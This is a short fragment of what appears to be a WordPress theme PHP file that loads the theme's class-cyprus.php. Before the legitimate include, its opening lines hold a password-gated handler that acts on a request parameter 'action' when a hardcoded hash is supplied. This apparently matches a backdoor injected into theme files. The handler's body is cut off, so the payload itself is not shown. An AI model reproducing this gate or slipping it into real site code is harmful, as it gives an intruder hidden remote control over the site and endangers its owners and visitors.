<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '6d23169890640fb239217704fbc46351'))
	{
 ...
 */
include_once get_parent_theme_file_path( 'includes/class-cyprus.php' );
